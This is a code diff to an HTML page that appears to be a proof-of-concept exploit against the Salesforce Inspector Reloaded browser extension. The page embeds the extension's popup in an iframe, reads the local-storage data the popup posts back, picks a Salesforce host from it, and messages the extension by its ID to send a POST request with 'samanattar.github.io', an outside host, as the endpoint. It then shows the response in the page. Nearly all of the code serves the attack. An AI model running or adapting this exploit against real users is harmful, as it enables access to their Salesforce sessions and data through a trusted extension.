@@ -4,27 +4,56 @@
     <title>SFDC Inspector Reloaded</title>
     <style>
         body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
-        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; }
+        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
+        #results { 
+            background: #fff;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-top: 20px;
+        }
+        pre { margin: 10px 0; white-space: pre-wrap; }
     </style>
 </head>
 <body>
     <div id="messages">Loading...</div>
+    <div id="results"></div>
     <script>
         const messagesDiv = document.getElementById('messages');
+        const resultsDiv = document.getElementById('results');
+
+        // Function to send message to extension
+        function sendToExtension(data) {
+            chrome.runtime.sendMessage('apfebnafilpofmbeebponacgbdhnkmnl', data, response => {
+                resultsDiv.innerHTML = `
+                    <h3>Response:</h3>
+                    <pre>${JSON.stringify(response, null, 2)}</pre>
+                `;
+            });
+        }
         
         window.addEventListener('message', function(event) {
-            // Log all messages for debugging
             console.log('Message received:', event.data);
             
-            // Only process messages from our extension
             if (event.data.insextInitRequest) {
-                messagesDiv.innerHTML += '<pre>Init Request: ' + JSON.stringify(event.data, null, 2) + '</pre>';
-            } else if (event.data.iFrameLocalStorage) {
-                messagesDiv.innerHTML += '<pre>Storage Data: ' + JSON.stringify(event.data.iFrameLocalStorage, null, 2) + '</pre>';
+                messagesDiv.innerHTML = '<pre>Init Request: ' + JSON.stringify(event.data, null, 2) + '</pre>';
+                
+                // Get the storage data
+                const storage = event.data.iFrameLocalStorage;
+                const firstHost = Object.keys(storage).find(key => key !== 'insextQueryHistory');
+                
+                if (firstHost) {
+                    // Send request to extension
+                    sendToExtension({
+                        method: 'POST',
+                        host: firstHost,
+                        endpoint: 'samanattar.github.io'
+                    });
+                }
             }
         });
 
-        // Create the iframe with a small delay to ensure our event listener is ready
+        // Create the iframe with a small delay
         setTimeout(() => {
             const initFrame = document.createElement('iframe');
             initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
